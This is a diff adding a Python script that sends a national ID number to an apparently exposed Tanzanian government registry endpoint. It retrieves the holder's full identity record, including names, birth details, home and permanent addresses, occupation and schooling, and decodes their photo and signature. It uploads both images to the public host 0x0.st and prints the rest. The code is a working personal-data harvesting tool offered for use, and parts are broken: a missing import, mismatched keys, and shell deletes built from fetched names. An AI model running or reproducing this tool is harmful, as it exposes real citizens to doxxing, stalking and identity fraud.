@@ -1,0 +1,146 @@
+#!/bin/python
+
+import requests
+import json
+import string
+import random
+from PIL import Image
+import io
+import base64
+import os,sys,prettytable
+import prettytable
+
+yellow = '\033[33m'
+blue = '\033[34m'
+cyan = '\033[36m'
+green = '\033[32;1m'
+red = '\033[31;1m'
+close = '\033[0m'
+
+def Textout(text):
+ for character in text:
+  sys.stdout.write(character)
+  sys.stdout.flush()
+  time.sleep(0.05)
+
+useragent = [
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24',
+    'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.7.62 Version/11.01',
+    'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)',
+    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1',
+    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5',
+    'Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11',
+]
+
+def nida():
+ print("")
+ url = "https://ors.brela.go.tz/um/load/load_nida/"
+ num = input(green+"Enter NIN: "+cyan)
+ digit = num.isdigit()
+ if str(len(num)) < str("20"):
+  print(red+"\nNIN is wrong\n"+close)
+  exit()
+ if digit == False:
+  print(red+"\nNIN cant contain letters\n"+close)
+  exit()
+
+ print(close+"")
+ try:
+  req = requests.post(url+str(num), headers={'Content-Type': 'application/json', 'Content-Length': '0'})
+  filter = req.json()
+  Results = filter['obj']['result']
+  decode = base64.b64decode(Results['PHOTO'])
+  img = Image.open(io.BytesIO(decode))
+  img.save(Results['FIRSTNAME']+'.jpg')
+  d_sig = base64.b64decode(Results['SIGNATURE'])
+  sign = Image.open(io.BytesIO(d_sig))
+  sign.save("signature"+Results['FirstName']+".jpg")
+
+  picture = str(Results['FirstName']+".jpg")
+  signature = str("signature"+Results['FirstName']+".jpg")
+
+  pic = {'file': open(picture, "rb")}
+  sig = {'file': open(signature, "rb")}
+
+  req1 = requests.post("https://0x0.st", files=pic)
+  req2 = requests.post("https://0x0.st", files=sig)
+
+  profile = req1.text
+  sahihi = req2.text
+ except:
+  print(red+"\nERROR SOMETHING IS WRONG, Probably Internet Connection or Your NIN not Found In System\n"+close)
+  exit()
+
+ def clean():
+  os.system("rm "+picture)
+  os.system("rm "+signature)
+
+ no = Results['NIN']
+ name1 = Results['FIRSTNAME']
+ name2 = Results['MIDDLENAME']
+ name3 = Results['SURNAME']
+ sex = Results['SEX']
+ date = Results['DATEOFBIRTH']
+ rRegion = Results['RESIDENTREGION']
+ rDistrict = Results['RESIDENTDISTRICT']
+ rWARD = Results['RESIDENTWARD']
+ rVillage = Results['RESIDENTVILLAGE']
+ rStreet = Results['RESIDENTSTREET']
+ rPostcode = Results['RESIDENTPOSTCODE']
+ pRegion = Results['PERMANENTREGION']
+ pDistrict = Results['PERMANENTDISTRICT']
+ pWard = Results['PERMANENTWARD']
+ pVillage = Results['PERMANENTVILLAGE']
+ pStreet = Results['PERMANENTSTREET']
+ bCountry = Results['BIRTHCOUNTRY']
+ bRegion = Results['BIRTHREGION']
+ bDistrict = Results['BIRTHDISTRICT']
+ bWard = Results['BIRTHWARD']
+ nation = Results['NATIONALITY']
+ mStatus = Results['MARITALSTATUS']
+ work = Results['OCCUPATION']
+ pSchool = Results['PRIMARYSCHOOLEDUCATION']
+ pDistrict = Results['PRIMARYSCHOOLDISTRICT']
+ pYear = Results['PRIMARYSCHOOLYEAR']
+
+ t = prettytable.PrettyTable([red+"INFO"+close, red+"STATUS"+close])
+ t.align[red+"INFO"+close] = "l"
+ t.align[red+"STATUS"+close] = "l"
+ t.add_row([green+"ID NUMBER"+close, cyan+str(no)+close])
+ t.add_row([green+"FIRST NAME"+close, cyan+str(name1)+close])
+ t.add_row([green+"MIDDLE NAME"+close, cyan+str(name2)+close])
+ t.add_row([green+"LAST NAME"+close, cyan+str(name3)+close])
+ t.add_row([green+"SEX"+close, cyan+str(sex)+close])
+ t.add_row([green+"BIRTH DATE"+close, cyan+str(date)+close])
+ t.add_row([green+"OCCUPATION"+close, cyan+str(work)+close])
+ t.add_row([green+"NATIONALITY"+close, cyan+str(nation)+close])
+ t.add_row([green+"MARITAL STATUS"+close, cyan+str(mStatus)+close])
+ t.add_row([green+"RESIDENT REGION"+close, cyan+str(rRegion)+close])
+ t.add_row([green+"RESIDENT DISTRICT"+close, cyan+str(rDistrict)+close])
+ t.add_row([green+"RESIDENT WARD"+close, cyan+str(rWARD)+close])
+ t.add_row([green+"RESIDENT VILLAGE"+close, cyan+str(rVillage)+close])
+ t.add_row([green+"RESIDENT STREET"+close, cyan+str(rStreet)+close])
+ t.add_row([green+"RESIDENT POSTCODE"+close, cyan+str(rPostcode)+close])
+ t.add_row([green+"PERMANENT REGION"+close, cyan+str(pRegion)+close])
+ t.add_row([green+"PERMANENT DISTRICT"+close, cyan+str(pDistrict)+close])
+ t.add_row([green+"PERMANENT WARD"+close, cyan+str(pWard)+close])
+ t.add_row([green+"PERMANENT VILLAGE"+close, cyan+str(pVillage)+close])
+ t.add_row([green+"PERMANENT STREET"+close, cyan+str(pStreet)+close])
+ t.add_row([green+"BIRTH COUNTRY"+close, cyan+str(bCountry)+close])
+ t.add_row([green+"BIRTH REGION"+close, cyan+str(bRegion)+close])
+ t.add_row([green+"BIRTH DISTRICT"+close, cyan+str(bDistrict)+close])
+ t.add_row([green+"BIRTH WARD"+close, cyan+str(bWard)+close])
+ t.add_row([green+"PRIMARY SCHOOL"+close, cyan+str(pSchool)+close])
+ t.add_row([green+"PRIMARY SCHOOL DISTRICT"+close, cyan+str(pDistrict)+close])
+ t.add_row([green+"PRIMARY SCHOOL YEAR"+close, cyan+str(pYear)+close])
+ t.add_row(["", ""])
+ t.add_row([green+"PICTURE"+close, cyan+profile+close])
+ t.add_row([green+"SIGNATURE"+close, cyan+sahihi+close])
+ print(t.get_string(title=yellow+"NIDA INFO by TH33HT: CITIZEN NAME: "+name1+close))
+ clean()
+nida()
